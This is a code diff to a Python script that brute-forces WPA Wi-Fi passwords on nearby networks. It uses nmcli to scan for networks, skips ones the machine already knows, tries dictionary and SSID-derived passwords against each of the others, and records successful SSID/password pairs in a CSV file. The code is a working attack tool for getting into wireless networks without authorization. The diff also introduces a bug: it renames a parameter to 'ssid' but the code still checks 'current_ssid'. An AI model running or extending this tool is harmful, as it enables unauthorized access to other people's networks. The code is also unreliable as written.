@@ -24,9 +24,15 @@ def signal_handler(sig, frame):
     sys.exit(0)
 
 
-def scan_wifi():
+def scan_wifi(ssid, existing_ssids, ignore_patterns):
     result = subprocess.run(
-        ['nmcli', '-t', 'dev', 'wifi'],
+        ['nmcli',
+         '-t',
+         '--fields',
+         'SSID,SECURITY,SIGNAL',
+         'device',
+         'wifi',
+         'list'],
         stdout=subprocess.PIPE)
     networks = result.stdout.decode('utf-8').split('\n')
 
@@ -34,16 +40,24 @@ def scan_wifi():
     for line in networks:
         if line:
             parts = line.split(':')
-            if len(parts) > 12:
+            if len(parts) > 2:
                 # SSID is the eighth element in the split line (0-indexed)
-                ssid = parts[7]
+                ssid = parts[0]
+                if len(ssid) == 0:
+                    continue
+                if ssid == current_ssid:
+                    continue
+                if ssid in existing_ssids:
+                    continue
+                if should_ignore_ssid(ssid, ignore_patterns):
+                    continue
                 # Security information is the ninth element (0-indexed)
-                security = parts[13]
+                security = parts[1]
                 # Check if WPA, WPA2, or WPA3 is in the security field
                 if 'WPA' in security:
                     try:
                         # Signal strength is the twelfth element (0-indexed)
-                        signal_strength = int(parts[11])
+                        signal_strength = int(parts[2])
                         ssid_signal_pairs.append((ssid, signal_strength))
                     except ValueError:
                         # If signal strength is not an integer, skip this entry
@@ -191,39 +205,14 @@ def main():
     initialize_csv(SUCCESS_CSV_FILE, ['SSID', 'Password'])
 
     ignore_patterns = read_ignore_list(IGNORE_FILE)
-    ssid_signal_pairs = scan_wifi()
     current_ssid = get_current_connection()
     existing_ssids = get_existing_connections()
+    ssid_signal_pairs = scan_wifi(current_ssid, existing_ssids, ignore_patterns)
     passwords = read_passwords('passwords.txt')
     failed_attempts = read_failed_attempts(FAILED_CSV_FILE)
 
     for ssid, signal_strength in ssid_signal_pairs:
-        if (
-            ssid == current_ssid
-            or ssid in existing_ssids
-            or should_ignore_ssid(ssid, ignore_patterns)
-        ):
-                print(f'Skipping network: {ssid} '
-                        '(already connected, configured, or ignored)')
-                continue
-
         print(f'Trying to connect to {ssid} with signal strength {signal_strength}')
-
-        # Generate passwords based on SSID and try them
-        generated_passwords = generate_passwords(ssid)
-        for password in generated_passwords:
-            if (ssid, password) in failed_attempts:
-                print(f'Skipping previously failed combination: {ssid} / {password}')
-                continue
-
-            if try_connect(ssid, password):
-                print(f'Successfully connected to {ssid} with generated password: {password}')
-                log_success(ssid, password, SUCCESS_CSV_FILE)
-                return
-            else:
-                print(f'Failed to connect to {ssid} with generated password: {password}')
-                log_failed_attempt(ssid, password, FAILED_CSV_FILE)
-                del_connection(ssid)
 
         # Try passwords from the dictionary
         for password in passwords:
@@ -240,6 +229,22 @@ def main():
                 log_failed_attempt(ssid, password, FAILED_CSV_FILE)
                 del_connection(ssid)
                 time.sleep(1)  # Optional: wait a bit before the next attempt
+
+        # Generate passwords based on SSID and try them
+        generated_passwords = generate_passwords(ssid)
+        for password in generated_passwords:
+            if (ssid, password) in failed_attempts:
+                print(f'Skipping previously failed combination: {ssid} / {password}')
+                continue
+
+            if try_connect(ssid, password):
+                print(f'Successfully connected to {ssid} with generated password: {password}')
+                log_success(ssid, password, SUCCESS_CSV_FILE)
+                return
+            else:
+                print(f'Failed to connect to {ssid} with generated password: {password}')
+                log_failed_attempt(ssid, password, FAILED_CSV_FILE)
+                del_connection(ssid)
 
     print('Failed to connect to any network with provided passwords.')
 
